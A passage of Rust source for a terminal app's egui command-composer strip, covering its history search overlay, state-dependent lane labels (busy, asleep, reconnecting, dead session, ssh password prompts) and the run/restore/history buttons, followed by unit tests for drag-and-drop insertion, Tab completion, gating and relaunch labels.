                        } else if can_submit && has_draft {
                            // Run ▸ is gated on a non-empty draft, so this is
                            // never the spacer gesture (that is Enter only).
                            // Focus stays in the editor (typeahead window).
                            let (bytes, _) = state.submit(backend, cover_line, sub_cwd);
                            out.write = bytes;
                        } else if (buffering || busy_hold)
                            && has_draft
                            && !cmd_multiline
                            && state.pending_has_room()
                        {
                            // Mid-window / mid-busy Run click = the Enter
                            // gesture: queue for the next prompt cycle
                            // (mouse-first parity with Enter's Queue).
                            state.queue_draft();
                        }
                    } else if !resp.has_focus() {
                        // Anywhere else on the strip: focus the editor.
                        state.want_focus = true;
                    }
                }
            }

            // ── Ctrl-R overlay paint (Tier-2b #1): the ranked results float
            // directly above the strip in the SAME Foreground-area pattern
            // as the multi-line draft editor (composer_pop) — the composer
            // growing upward, never a foreign window (seamless doctrine).
            // Rendered AFTER the TextEdit so the rows always reflect THIS
            // frame's query; the key handling at the top of the branch acted
            // on last frame's list (what the user actually saw). Depth by
            // shadow + background, selection by fill shift — no strokes.
            if searching && !overlay_open {
                let hits = search_results(recs, &state.draft, SEARCH_MAX);
                state.search_clamp(hits.len());
                let sel = state.search.as_ref().map(|s| s.sel).unwrap_or(0);
                let mut clicked: Option<String> = None;
                let pop_w = strip_rect.width() - 16.0;
                egui::Area::new(Id::new(("composer_search", terminal_id)))
                    .order(egui::Order::Foreground)
                    .pivot(Align2::LEFT_BOTTOM)
                    .fixed_pos(Pos2::new(strip_rect.min.x + 8.0, strip_rect.min.y))
                    .show(ui.ctx(), |aui| {
                        egui::Frame::new()
                            .fill(super::TERM_BG)
                            .corner_radius(CornerRadius::same(8))
                            .shadow(egui::epaint::Shadow {
                                offset: [0, 6],
                                blur: 28,
                                spread: 0,
                                color: Color32::from_black_alpha(150),
                            })
                            .inner_margin(egui::Margin::symmetric(10, 6))
                            .show(aui, |aui| {
                                aui.set_width(pop_w - 20.0);
                                if hits.is_empty() {
                                    let (rect, _) = aui.allocate_exact_size(
                                        Vec2::new(pop_w - 20.0, row_h + 6.0),
                                        Sense::hover(),
                                    );
                                    aui.painter().text(
                                        Pos2::new(rect.min.x + 6.0, rect.center().y),
                                        Align2::LEFT_CENTER,
                                        "no matches",
                                        FontId::proportional(10.0),
                                        super::TEXT_FAINT,
                                    );
                                    return;
                                }
                                // Best match at the BOTTOM, adjacent to the
                                // query lane; the eye travels UP for older /
                                // lower-ranked (readline's spatial model,
                                // upward like the multi-line editor).
                                for (i, hit) in hits.iter().enumerate().rev() {
                                    let (rect, rresp) = aui.allocate_exact_size(
                                        Vec2::new(pop_w - 20.0, row_h + 6.0),
                                        Sense::click(),
                                    );
                                    let rp = aui.painter();
                                    if i == sel {
                                        // Selected: subtle fill shift, the
                                        // app's standard selected surface.
                                        rp.rect_filled(
                                            rect,
                                            CornerRadius::same(4),
                                            super::SURFACE_2,
                                        );
                                    } else if rresp.hovered() {
                                        rp.rect_filled(
                                            rect,
                                            CornerRadius::same(4),
                                            super::OV_HOVER,
                                        );
                                    }
                                    let base = if i == sel {
                                        super::TEXT
                                    } else {
                                        super::TEXT_SECONDARY
                                    };
                                    let job =
                                        search_row_job(&hit.disp, &hit.hl, base, &font);
                                    let g = aui.fonts_mut(|f| f.layout_job(job));
                                    let pos = Pos2::new(
                                        rect.min.x + 6.0,
                                        rect.center().y - g.size().y / 2.0,
                                    );
                                    // Long commands CLIP at the row edge —
                                    // honest truncation, indices stay true
                                    // (an ellipsis would shift the
                                    // highlight spans).
                                    rp.with_clip_rect(rect).galley(pos, g, base);
                                    if rresp.clicked() {
                                        clicked = Some(hit.cmd.clone());
                                    }
                                }
                            });
                    });
                // Mouse-first parity: a row click IS the Enter gesture.
                if let Some(cmd) = clicked {
                    state.search_accept(&cmd);
                }
            }

            out.has_focus = resp.has_focus() && state.mode == ComposerMode::Compose;
        }

        ComposerMode::Raw(_) => {
            // Dead-relaunch fix a — Enter relaunches a dead terminal (the
            // terminal-native gesture: VS Code / iTerm "press Enter to
            // restart"). Guards live in `dead_enter_restores` (pure):
            // SessionEnded lane only (asleep/reconnecting keep their Enter
            // untouched), terminal owns the keyboard, EMPTY draft (a
            // non-empty draft's Enter is left unconsumed), no overlay.
            // Repeats collapse into ONE restore (launch() only proceeds
            // from Dead anyway). Same out.restore → RestartTerminal path
            // as the mouse verb.
            if !collapsed
                && dead_enter_restores(
                    dead_lane,
                    state.term_focused,
                    has_draft,
                    overlay_open,
                )
            {
                let mut enters = 0u32;
                while ui.input_mut(|i| i.consume_key(Modifiers::NONE, Key::Enter)) {
                    enters += 1;
                }
                if enters > 0 {
                    out.restore = true;
                }
            }
            // LEFT lane by the stable-chrome state table + hysteresis
            // (lane_content — pure, table-tested): the lane may change
            // content only on REAL state changes; transients younger than
            // REVEAL render FROZEN QUIET (the per-submit 4-layout strip
            // cycle killer). The right cluster below never reacts to any of
            // this.
            let open_rec = recs.iter().rev().find(|r| r.end_off.is_none());
            match lane_content(state, running, inputs.alt, open_rec.is_some(), now) {
                LaneContent::Editor => unreachable!("mode is Raw"),
                LaneContent::SessionEnded => {
                    // TEXT_SECONDARY, not FAINT: on a dead ssh tab this line
                    // plus the Run-slot `↻ Restore ⏎` IS the whole lifecycle
                    // affordance (Bug 4 — the field screenshot's near-
                    // invisible label under raw client_loop noise). The text
                    // names the gesture and what it re-runs (fix a).
                    painter.text(
                        Pos2::new(lane_x, strip_rect.center().y),
                        Align2::LEFT_CENTER,
                        relaunch_label(state.relaunch_cmd.as_deref()),
                        FontId::proportional(12.0),
                        super::TEXT_SECONDARY,
                    );
                }
                LaneContent::Reconnecting => {
                    // Daemon-certain state (the supervision flag rides the
                    // Snapshot): spinner + label; Cancel lives in the Run
                    // slot below. 100ms repaints keep the arc turning.
                    // F1: a MANUAL (unlimited) ladder reports its attempts
                    // honestly (`retrying — attempt 7 · next in 30s`) via
                    // the Snapshot-stamped progress; the auto lane keeps
                    // the plain label.
                    super::toast::spinner(
                        &painter,
                        Pos2::new(lane_x + 6.0, strip_rect.center().y),
                        5.0,
                        ui.input(|i| i.time),
                        super::ACCENT,
                    );
                    painter.text(
                        Pos2::new(lane_x + 18.0, strip_rect.center().y),
                        Align2::LEFT_CENTER,
                        retry_lane_label(state.retry_attempt, state.retry_next_s),
                        FontId::proportional(12.0),
                        super::TEXT_SECONDARY,
                    );
                    ui.ctx()
                        .request_repaint_after(std::time::Duration::from_millis(100));
                }
                LaneContent::Asleep => {
                    // SLEEP §7.3: `☾ asleep` — painter moon (never a font
                    // glyph, S14) + muted label. The Wake ▸ affordance lives
                    // in the fixed Run slot (painted with the right cluster
                    // below — stable chrome F3: same slot, dim-never-
                    // unmount); its click is handled with the strip's.
                    super::draw_moon(
                        &painter,
                        Pos2::new(lane_x + 6.0, strip_rect.center().y),
                        5.0,
                        super::TEXT_MUTED,
                        super::TERM_BG,
                    );
                    painter.text(
                        Pos2::new(lane_x + 18.0, strip_rect.center().y),
                        Align2::LEFT_CENTER,
                        "asleep",
                        FontId::proportional(12.0),
                        super::TEXT_MUTED,
                    );
                }
                LaneContent::AltScreen => {
                    // Bug C/C2: pre-collapse this paints at full alpha; once
                    // collapsed it appears only inside the hover-peek
                    // overlay (reveal rides the peek fade, over the wash).
                    if reveal > 0.0 {
                        painter.text(
                            Pos2::new(lane_x, strip_rect.center().y),
                            Align2::LEFT_CENTER,
                            "Keys go to the app",
                            FontId::proportional(12.0),
                            super::TEXT_FAINT.gamma_multiply(reveal),
                        );
                    }
                }
                LaneContent::Frozen => {
                    // FROZEN lane text through the submit handoff: at Enter
                    // the only pixel change is the caret disappearing; the
                    // text stays put until the echo is grid-verified above
                    // (history-cover conversion) — then the lane empties the
                    // same frame the `❯ cwd cmd` row appears in the grid:
                    // the line visibly commits upward, like a terminal.
                    let x = paint_prompt_prefix(&painter, lane_rect, prompt_cwd, &font);
                    let ghost = state
                        .submit_hold
                        .as_ref()
                        .map(|h| h.ghost.clone())
                        .unwrap_or_default();
                    if !ghost.is_empty() {
                        let g = painter.layout_no_wrap(ghost, font.clone(), super::TEXT);
                        painter.galley(
                            Pos2::new(x, strip_rect.center().y - g.size().y / 2.0),
                            g,
                            super::TEXT,
                        );
                    }
                }
                LaneContent::Quiet => {
                    // Never switch content for a transient that resolves in
                    // 1-2 frames (post-submit windows, the pre→133;B render
                    // gap, hold releases, un-revealed busy) — just schedule
                    // the reveal so it fires without input.
                    let next = state
                        .busy_since
                        .into_iter()
                        .chain(state.last_activity)
                        .map(|t| REVEAL.saturating_sub(now.duration_since(t)))
                        .filter(|d| !d.is_zero())
                        .min();
                    if let Some(d) = next {
                        ui.ctx().request_repaint_after(d);
                    }
                }
                LaneContent::Busy
                    if open_rec.is_some()
                        && (heur_episode
                            || open_rec.is_some_and(|r| nested_shell_cmd(&r.cmd))) =>
                {
                    // Bug D: the open block is a NESTED SHELL episode
                    // (`sudo su`, `su`, plain `bash`, …) — no hooks exist in
                    // that shell, the rec stays open the whole visit, and
                    // NOTHING is running: the user is at a raw prompt. The
                    // pulsing-dot + forever-counting elapsed lane told the
                    // wrong story ("sudo su · 1h 02m"); this one is honest.
                    // Render-only: the gate stays Blocked(Busy) (typing must
                    // go raw), the cover stays absent (drop-don't-drift),
                    // and the daemon is untouched — `exit` re-attaches via
                    // the ordinary pre edge + F7 override, no re-arm code.
                    // The password sub-case reads the CURSOR row only (the
                    // pre-shell lock-line contract): a miss degrades to the
                    // generic line. No timers, no repaint asks — the row
                    // text only changes with output, which repaints anyway.
                    let rec = open_rec.expect("guard matched Some");
                    let icon_c = Pos2::new(lane_x + 6.0, strip_rect.center().y);
                    match nested_shell_line(&backend.cursor_row_text()) {
                        NestedShellLine::Password => {
                            draw_lock(&painter, icon_c, super::TEXT_FAINT);
                            painter.text(
                                Pos2::new(lane_x + 20.0, strip_rect.center().y),
                                Align2::LEFT_CENTER,
                                "password \u{2014} keys go straight to the shell, \
                                 never shown or stored",
                                FontId::proportional(12.0),
                                super::TEXT_SECONDARY,
                            );
                        }
                        NestedShellLine::Generic => {
                            draw_keyboard(&painter, icon_c, super::TEXT_FAINT);
                            let cmd = super::middle_ellipsize(
                                &rec.cmd.replace(['\r', '\n'], " "),
                                24,
                            );
                            let g = painter.layout_no_wrap(
                                cmd,
                                FontId::monospace(12.0),
                                super::TEXT_SECONDARY,
                            );
                            let cw = g.size().x;
                            painter.galley(
                                Pos2::new(
                                    lane_x + 20.0,
                                    strip_rect.center().y - g.size().y / 2.0,
                                ),
                                g,
                                super::TEXT_SECONDARY,
                            );
                            painter.text(
                                Pos2::new(lane_x + 26.0 + cw, strip_rect.center().y),
                                Align2::LEFT_CENTER,
                                "\u{2014} no Pulse integration in this shell; \
                                 typing goes to the terminal",
                                FontId::proportional(12.0),
                                super::TEXT_FAINT,
                            );
                        }
                    }
                }
                LaneContent::Busy => {
                    if let Some(rec) = open_rec {
                        // Pulsing dot + running command + live elapsed. The
                        // Working-pulse wakeup only fires while output is
                        // <800ms old — a long-running SILENT command would
                        // leave only the 1s heartbeat, which aliases the
                        // 1s-period sine into a frozen dot. Ask for the
                        // ~100ms cadence ourselves.
                        ui.ctx().request_repaint_after(Duration::from_millis(100));
                        let time = ui.input(|i| i.time);
                        let pulse =
                            0.6 + 0.4 * (time as f32 * std::f32::consts::TAU).sin().abs();
                        painter.circle_filled(
                            Pos2::new(lane_x + 4.0, strip_rect.center().y),
                            3.5,
                            super::ACCENT.gamma_multiply(pulse),
                        );
                        let cmd =
                            super::middle_ellipsize(&rec.cmd.replace(['\r', '\n'], " "), 48);
                        let g = painter.layout_no_wrap(
                            cmd,
                            FontId::monospace(12.0),
                            super::TEXT_SECONDARY,
                        );
                        let cw = g.size().x;
                        painter.galley(
                            Pos2::new(lane_x + 16.0, strip_rect.center().y - g.size().y / 2.0),
                            g,
                            super::TEXT_SECONDARY,
                        );
                        let dur = super::term_view::fmt_duration(
                            now_ms().saturating_sub(rec.started_ms),
                        );
                        painter.text(
                            Pos2::new(lane_x + 24.0 + cw, strip_rect.center().y),
                            Align2::LEFT_CENTER,
                            dur,
                            FontId::proportional(11.0),
                            super::TEXT_MUTED,
                        );
                    }
                }
                // PRE-SHELL raw conversation (v0.1.1): ssh auth / login
                // chain — no shell exists yet, so the lane narrates the
                // conversation instead of offering Compose (the arm veto
                // above keeps `arm_available` false; the strip is inert
                // except the right cluster, and typing goes to the grid —
                // exactly where password keys must land). The password line
                // gets the lock glyph; detection reads the CURSOR row only
                // and a miss degrades to the generic line (render-only, no
                // wrong-cover class risk). ssh-family only: a WSL pre-shell
                // lasts sub-second and a degraded hookless remote shell
                // should not claim "ssh is asking" forever… it still does
                // in the hooks-never-arrived case, which is the honest
                // reading (the terminal IS raw passthrough there).
                LaneContent::Label if pre_shell_now && state.is_ssh => {
                    let auth = detect_auth_prompt(&backend.cursor_row_text());
                    let (label, label_col) = match auth {
                        AuthPrompt::Password => (
                            "password \u{2014} keys go straight to ssh, never shown or stored",
                            super::TEXT_SECONDARY,
                        ),
                        AuthPrompt::HostKey => (
                            "host key check \u{2014} answer yes or no",
                            super::TEXT_SECONDARY,
                        ),
                        AuthPrompt::None => (
                            "ssh is asking \u{2014} type your answer in the terminal",
                            super::TEXT_FAINT,
                        ),
                    };
                    let icon_c = Pos2::new(lane_x + 6.0, strip_rect.center().y);
                    if auth == AuthPrompt::Password {
                        draw_lock(&painter, icon_c, super::TEXT_FAINT);
                    } else {
                        draw_keyboard(&painter, icon_c, super::TEXT_FAINT);
                    }
                    painter.text(
                        Pos2::new(lane_x + 20.0, strip_rect.center().y),
                        Align2::LEFT_CENTER,
                        label,
                        FontId::proportional(12.0),
                        label_col,
                    );
                }
                LaneContent::Label => {
                // Steady NoPrompt / UserRaw (and Busy-by-mouse-mode): honest
                // raw label; the ❯ Compose affordance appears ONLY here — a
                // real steady state, never a per-submit transient. A DIRTY
                // armable prompt says what the click will do to the typed
                // text BEFORE the click (P4 §2.1 — the label IS the reclaim
                // affordance). "Dirty" needs a live prompt-end capture to
                // speak about: during the pre→133;B render window prompt_end
                // is deliberately invalidated.
                let dirty =
                    arm_available && !inputs.cursor_clean && backend.has_prompt_end();
                let preview = dirty.then(|| activation_preview(backend));
                let (label, label_col) = match preview {
                    Some(ActPreview::Keeps) => (
                        "Typed text at the prompt \u{2014} Compose keeps it",
                        super::TEXT_SECONDARY,
                    ),
                    Some(ActPreview::Clears) => (
                        "Typed text at the prompt \u{2014} Compose clears it",
                        super::TEXT_SECONDARY,
                    ),
                    None => ("Typing goes to the terminal", super::TEXT_FAINT),
                };
                draw_keyboard(
                    &painter,
                    Pos2::new(lane_x + 6.0, strip_rect.center().y),
                    super::TEXT_FAINT,
                );
                painter.text(
                    Pos2::new(lane_x + 20.0, strip_rect.center().y),
                    Align2::LEFT_CENTER,
                    label,
                    FontId::proportional(12.0),
                    label_col,
                );
                if let Some(p) = preview {
                    // The whole strip is the activation button — repeat the
                    // promise with the mechanism on hover.
                    strip_resp.clone().on_hover_text(match p {
                        ActPreview::Keeps => "Moves what you've typed into the editor",
                        ActPreview::Clears => "Cancels the typed line (Ctrl+C)",
                    });
                }
                if arm_available {
                    // ❯ Compose in its FIXED slot left of History (the same
                    // slot the Compose hints use) — text that brightens on
                    // hover, never a bordered button (seamless doctrine).
                    let over = hover_pos.is_some_and(|p| strip_rect.contains(p));
                    let col = if over {
                        super::ACCENT_HOVER
                    } else {
                        super::ACCENT.gamma_multiply(0.85)
                    };
                    let g = painter.layout_no_wrap(
                        "\u{276f} Compose".into(),
                        FontId::proportional(12.0),
                        col,
                    );
                    let gw = g.size().x;
                    painter.galley(
                        Pos2::new(slot_right - gw, strip_rect.center().y - g.size().y / 2.0),
                        g,
                        col,
                    );
                }
                }
            }

            // Interactions: History toggles the popup in every Raw state
            // (inert only under alt-screen); the REST of the strip is the
            // activation target (mouse-first) when arming is possible.
            // C2: while collapsed the interact sits on an empty rect so
            // `clicked()` can never fire — the `!collapsed` guard is a belt
            // for synthetic Responses; band clicks belong to the grid.
            if strip_resp.clicked() && !collapsed {
                if let Some(p) = strip_resp.interact_pointer_pos() {
                    if hist_rect.contains(p) {
                        if !inputs.alt {
                            out.toggle_history = true;
                        }
                    } else if asleep_lane && run_rect.contains(p) {
                        // SLEEP inv. 5: waking is THIS explicit click on the
                        // visible Wake ▸ — selecting/scrolling/copying never
                        // wakes. The app sends RestartTerminal (= wake, S5).
                        out.wake = true;
                    } else if recon_lane && run_rect.contains(p) {
                        // Cancel the reconnect supervision (an in-flight
                        // attempt keeps running daemon-side; future retries
                        // stop and the ordinary Dead affordances take over).
                        out.cancel_reconnect = true;
                    } else if dead_lane
                        && retry_rect
                            .is_some_and(|r| r.expand2(Vec2::new(6.0, 8.0)).contains(p))
                    {
                        // Fix b: manual bounded retry (ssh only) — the
                        // daemon enters the existing 2s/10s/30s supervision
                        // by explicit consent; Cancel in the Reconnecting
                        // lane stops it exactly like the auto path.
                        out.retry_reconnect = true;
                    } else if dead_lane {
                        // The unmissable dead-tab relaunch (Bug 4, widened
                        // by fix a): the WHOLE dead strip is the restore
                        // target, not just the Run slot — a click on a dead
                        // terminal means "bring it back" (History above
                        // already claimed its own rect).
                        out.restore = true;
                    } else if arm_available {
                        out.write = state.activate(backend);
                    }
                }
            }
            if arm_available
                || ((asleep_lane || recon_lane) && over_run)
                || (dead_lane && !over_hist)
            {
                strip_resp.on_hover_cursor(egui::CursorIcon::PointingHand);
            }
        }
    }

    // ── Right cluster: fixed slots, painted in EVERY mode (stable chrome,
    // F3). Elements dim when inert; they never move and never unmount —
    // across armed → submit window → Busy → armed the cluster is pixel-static.
    // Bug C carve-out: under a STABLE full-screen app (the alt lane, one
    // real state, entered/left only on real mode edges with HIDE_AFTER
    // hysteresis) the cluster fades with the lane — under alt every slot is
    // inert, so there is no live chrome for F3 to keep stable. Slots still
    // never move: alpha only. `cluster_alpha` is 1.0 in every non-alt lane,
    // so `Wake ▸`/`Cancel`/`Restore ▸` paint at full strength the same
    // frame their lane appears.
    let cluster_alpha = if lane_is_alt { reveal } else { 1.0 };
    if cluster_alpha > 0.0 {
        let compose = state.mode == ComposerMode::Compose;
        // Run is also live mid-window (it queues) — mouse-first parity with
        // the Enter gesture. SLEEP §7.3: an asleep lane swaps this slot to
        // the accent `Wake ▸` (S15 — the input-shaped affordance in the
        // stationary input furniture; same slot, zero chrome movement).
        if asleep_lane {
            painter.text(
                run_rect.center(),
                Align2::CENTER_CENTER,
                "Wake \u{25b8}",
                FontId::proportional(12.0),
                if over_run { super::ACCENT_HOVER } else { super::ACCENT },
            );
        } else if recon_lane {
            painter.text(
                run_rect.center(),
                Align2::CENTER_CENTER,
                "Cancel",
                FontId::proportional(12.0),
                if over_run { super::ACCENT_HOVER } else { super::ACCENT },
            );
        } else if dead_lane {
            // Fix a: verb + silent keyboard accelerator (`↻ Restore  ⏎`),
            // full ACCENT — on a dead tab this IS the primary action, not
            // idle chrome. Mouse-first preserved: the ⏎ only names the
            // Enter path, the whole strip is the click target.
            painter.text(
                run_rect.center(),
                Align2::CENTER_CENTER,
                "\u{21bb} Restore  \u{23ce}",
                FontId::proportional(12.0),
                if over_run { super::ACCENT_HOVER } else { super::ACCENT },
            );
            // Fix b: the second verb — `Retry ▸` (ssh only): keep trying
            // until the host is back, bounded and cancellable. Quieter than
            // Restore (0.85 like ❯ Compose): Restore stays the primary.
            if let Some(rr) = retry_rect {
                let over =
                    hover_pos.is_some_and(|p| rr.expand2(Vec2::new(6.0, 8.0)).contains(p));
                let col = if over {
                    super::ACCENT_HOVER
                } else {
                    super::ACCENT.gamma_multiply(0.85)
                };
                let g = painter.layout_no_wrap(
                    "Retry \u{25b8}".to_string(),
                    FontId::proportional(12.0),
                    col,
                );
                painter.galley(rr.min, g, col);
            }
        } else {
        let run_on = compose && has_draft && (can_submit || buffering) && !cmd_multiline;
        let run_col = if !run_on {
            super::TEXT_FAINT
        } else if over_run {
            super::ACCENT_HOVER
        } else {
            super::ACCENT
        };
        painter.text(
            run_rect.center(),
            Align2::CENTER_CENTER,
            "Run \u{25b8}",
            FontId::proportional(12.0),
            run_col.gamma_multiply(cluster_alpha),
        );
        }
        let hist_active = !inputs.alt;
        super::draw_icon(
            &painter,
            hist_rect.shrink(5.0),
            super::Icon::History,
            (if hist_active && over_hist {
                super::TEXT
            } else {
                super::TEXT_FAINT
            })
            .gamma_multiply(cluster_alpha),
        );
        // ⌨: the to-raw toggle while composing; already-raw states keep the
        // glyph faint and inert (dim, never vanish).
        draw_keyboard(
            &painter,
            kbd_rect.center(),
            (if compose && over_kbd {
                super::TEXT
            } else {
                super::TEXT_FAINT
            })
            .gamma_multiply(cluster_alpha),
        );
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::gui::term_backend::GridSize;

    /// QOL §4.5: dropped text APPENDS into the draft being typed (space
    /// separator only when needed), caret to the end — never the
    /// stash/replace semantics of `insert_history`.
    #[test]
    fn insert_dropped_text_appends_into_draft() {
        let mut st = ComposerState::default();
        st.insert_dropped_text("'C:\\a.png' ");
        assert_eq!(st.draft, "'C:\\a.png' ");
        assert!(st.caret_to_end);
        // Mid-word draft gains a separator; trailing-space drafts don't.
        st.draft = "claude look at".into();
        st.insert_dropped_text("'C:\\b.png' ");
        assert_eq!(st.draft, "claude look at 'C:\\b.png' ");
        st.insert_dropped_text("'C:\\c.png' ");
        assert_eq!(st.draft, "claude look at 'C:\\b.png' 'C:\\c.png' ");
        // A displaced recall stash dies like on any edit.
        st.recall = Some((RecallSrc::History, "old".into()));
        st.insert_dropped_text("x");
        assert!(st.recall.is_none());
    }

    /// Fresh temp dir for the Tab-completion state-machine tests.
    fn tab_scratch(names: &[&str]) -> std::path::PathBuf {
        use std::sync::atomic::{AtomicU32, Ordering};
        static N: AtomicU32 = AtomicU32::new(0);
        let d = std::env::temp_dir().join(format!(
            "tc_comp_tab_{}_{}",
            std::process::id(),
            N.fetch_add(1, Ordering::Relaxed)
        ));
        for n in names {
            std::fs::create_dir_all(d.join(n)).unwrap();
        }
        d
    }

    /// #24: the whole composer-side cycle walk — forward, reverse, Esc
    /// restore (one Esc consumes the cycle), and edit-commits (any other
    /// draft change invalidates the cycle so the shown candidate stands).
    #[test]
    fn tab_press_cycles_esc_restores_and_edits_commit() {
        let dir = tab_scratch(&["alpha", "bravo"]);
        let cwd = dir.to_str().unwrap();
        let mut st = ComposerState {
            draft: "cd ".into(),
            recall: Some((RecallSrc::History, "stash".into())),
            ..Default::default()
        };
        let caret = st.tab_press(Some(cwd), 3, 1).unwrap();
        assert_eq!(st.draft, r"cd alpha\");
        assert_eq!(caret, 9);
        assert!(st.tab_active());
        // Completion forks recall exactly like typing (§6.2).
        assert!(st.recall.is_none());
        // Repeat Tab cycles forward; Shift+Tab walks back.
        st.tab_press(Some(cwd), 0, 1).unwrap();
        assert_eq!(st.draft, r"cd bravo\");
        st.tab_press(Some(cwd), 0, -1).unwrap();
        assert_eq!(st.draft, r"cd alpha\");
        // Esc restores the original token byte-exact and ends the cycle.
        let caret = st.tab_escape().unwrap();
        assert_eq!(st.draft, "cd ");
        assert_eq!(caret, 3);
        assert!(!st.tab_active());
        // Typing mid-cycle commits the candidate: the stale cycle drops and
        // the next Tab re-plans from the edited token (no matches here).
        st.tab_press(Some(cwd), 3, 1).unwrap();
        st.draft.push('X');
        assert!(!st.tab_active());
        assert_eq!(st.tab_press(Some(cwd), st.draft.len(), 1), None);
        assert_eq!(st.draft, r"cd alpha\X");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// #24: consumed-but-inert cases — empty/whitespace drafts and ssh
    /// (no local view of the remote fs) never touch the draft.
    #[test]
    fn tab_no_ops_on_empty_draft_and_ssh() {
        let mut st = ComposerState::default();
        assert_eq!(st.tab_press(Some(r"C:\"), 0, 1), None);
        st.draft = "   ".into();
        assert_eq!(st.tab_press(Some(r"C:\"), 3, 1), None);
        assert_eq!(st.draft, "   ");
        st.fam = complete::Family::Ssh;
        st.draft = "cat x".into();
        assert_eq!(st.tab_press(Some("/home/z"), 5, 1), None);
        assert_eq!(st.draft, "cat x");
        // No cycle ⇒ tab_escape declines (the Esc chain proceeds).
        assert_eq!(st.tab_escape(), None);
    }

    fn raw_inputs() -> GateInputs {
        GateInputs {
            hooked: true,
            running: true,
            alt: false,
            mouse: false,
            open_block: false,
            at_prompt: true,
            settled: true,
            cursor_clean: true,
            episode_used: false,
            asleep: false,
        }
    }

    /// §2.5, every row — including the AutoArm/ManualOnly split.
    #[test]
    fn gate_truth_table() {
        assert_eq!(gate(&raw_inputs()), GateVerdict::AutoArm);
        type Case = (fn(&mut GateInputs), GateVerdict);
        let cases: Vec<Case> = vec![
            (
                |i| i.hooked = false,
                GateVerdict::Blocked(RawReason::NoPrompt),
            ),
            (|i| i.running = false, GateVerdict::Blocked(RawReason::Dead)),
            (|i| i.alt = true, GateVerdict::Blocked(RawReason::AltScreen)),
            (
                |i| i.open_block = true,
                GateVerdict::Blocked(RawReason::Busy),
            ),
            (|i| i.mouse = true, GateVerdict::Blocked(RawReason::Busy)),
            (
                |i| i.at_prompt = false,
                GateVerdict::Blocked(RawReason::NoPrompt),
            ),
            (
                |i| i.settled = false,
                GateVerdict::Blocked(RawReason::NoPrompt),
            ),
            (|i| i.cursor_clean = false, GateVerdict::ManualOnly),
            (|i| i.episode_used = true, GateVerdict::ManualOnly),
        ];
        for (mutate, expect) in cases {
            let mut i = raw_inputs();
            mutate(&mut i);
            assert_eq!(gate(&i), expect);
        }
        // Precedence: a dead session is Dead even in alt-screen; an open
        // block outranks the prompt latch.
        let mut i = raw_inputs();
        i.running = false;
        i.alt = true;
        assert_eq!(gate(&i), GateVerdict::Blocked(RawReason::Dead));
        let mut i = raw_inputs();
        i.open_block = true;
        i.cursor_clean = false;
        assert_eq!(gate(&i), GateVerdict::Blocked(RawReason::Busy));
        // SLEEP: the flag outranks running/dead (it covers the Sleeping
        // drain transient AND keeps tick from clobbering Raw(Asleep) back
        // to Raw(Dead) after the exit lands).
        let mut i = raw_inputs();
        i.asleep = true;
        assert_eq!(gate(&i), GateVerdict::Blocked(RawReason::Asleep));
        i.running = false;
        assert_eq!(gate(&i), GateVerdict::Blocked(RawReason::Asleep));
    }

    /// SLEEP §7.3: the lane presents `☾ asleep` for a flagged terminal —
    /// via the Raw(Asleep) reason, and via the flag+dead belt during the
    /// one-frame Snapshot-before-tick window; a woken (unflagged) dead
    /// terminal stays SessionEnded.
    #[test]
    fn lane_content_asleep_arm() {
        let now = Instant::now();
        let mut st = ComposerState {
            asleep: true,
            mode: ComposerMode::Raw(RawReason::Asleep),
            ..Default::default()
        };
        assert_eq!(lane_content(&st, false, false, false, now), LaneContent::Asleep);
        // Belt: mode still says Dead but the flag already landed.
        st.mode = ComposerMode::Raw(RawReason::Dead);
        assert_eq!(lane_content(&st, false, false, false, now), LaneContent::Asleep);
        // The transient: flagged + still running (drain window).
        st.mode = ComposerMode::Raw(RawReason::Asleep);
        assert_eq!(lane_content(&st, true, false, false, now), LaneContent::Asleep);
        // Not flagged ⇒ the ordinary dead lane.
        st.asleep = false;
        st.mode = ComposerMode::Raw(RawReason::Dead);
        assert_eq!(
            lane_content(&st, false, false, false, now),
            LaneContent::SessionEnded
        );
    }

    /// Dead-relaunch fix a — the strip-presence gate: hooked exactly as
    /// before; Dead and reconnecting newly eligible (a never-hooked dead
    /// ssh tab gets the SessionEnded affordance; a hookless manual-retry
    /// tab keeps Cancel through the Running-attempt phases); a LIVE
    /// hookless terminal renders NO strip — the gate only moves on real
    /// lifecycle edges, so live hookless tabs cannot storm geometry.
    #[test]
    fn strip_eligible_gate() {
        assert!(strip_eligible(true, false, false), "hooked, running");
        assert!(strip_eligible(true, true, false), "hooked, dead");
        assert!(
            strip_eligible(false, true, false),
            "hookless dead — the field case (timed-out ssh)"
        );
        assert!(
            strip_eligible(false, false, true),
            "hookless mid-supervision attempt keeps its Cancel lane"
        );
        assert!(
            !strip_eligible(false, false, false),
            "LIVE hookless: no strip, ever (no strip-storm)"
        );
    }

    /// Fix a — Enter ownership on a dead terminal (pure table): relaunch
    /// only on SessionEnded + keyboard owned + EMPTY draft + no overlay;
    /// every other row leaves Enter exactly where it was.
    #[test]
    fn dead_enter_restores_table() {
        let d = dead_enter_restores;
        assert!(d(true, true, false, false), "the field gesture");
        assert!(
            !d(false, true, false, false),
            "asleep/reconnecting/live lanes keep their Enter"
        );
        assert!(!d(true, false, false, false), "keyboard owned elsewhere");
        assert!(!d(true, true, true, false), "non-empty draft: NOT consumed");
        assert!(!d(true, true, false, true), "overlay owns Enter");
    }

    /// Fix a — the relaunch-hint strings (the spec's label test): ssh
    /// names its destination, a plain shell gets the bare gesture, and a
    /// Custom command names its program stem.
    #[test]
    fn relaunch_label_strings() {
        use crate::state::TermKind;
        let ssh = relaunch_desc(
            &TermKind::Shell,
            "ssh.exe",
            &["192.168.50.239".to_string()],
        );
        assert_eq!(ssh.as_deref(), Some("ssh 192.168.50.239"));
        assert_eq!(
            relaunch_label(ssh.as_deref()),
            "Press Enter to relaunch \u{2014} ssh 192.168.50.239"
        );
        // Plain shell: the bare gesture.
        let sh = relaunch_desc(&TermKind::Shell, "powershell.exe", &["-NoLogo".into()]);
        assert_eq!(sh, None);
        assert_eq!(relaunch_label(None), "Press Enter to relaunch");
        // A hand-built Custom `ssh.exe host` still resolves the destination…
        let custom_ssh = relaunch_desc(&TermKind::Custom, "ssh.exe", &["h0st".to_string()]);
        assert_eq!(custom_ssh.as_deref(), Some("ssh h0st"));
        // …and a generic Custom names its program stem.
        let cmd = relaunch_desc(
            &TermKind::Custom,
            "cmd.exe",
            &["/c".to_string(), "exit 1".to_string()],
        );
        assert_eq!(cmd.as_deref(), Some("cmd"));
    }

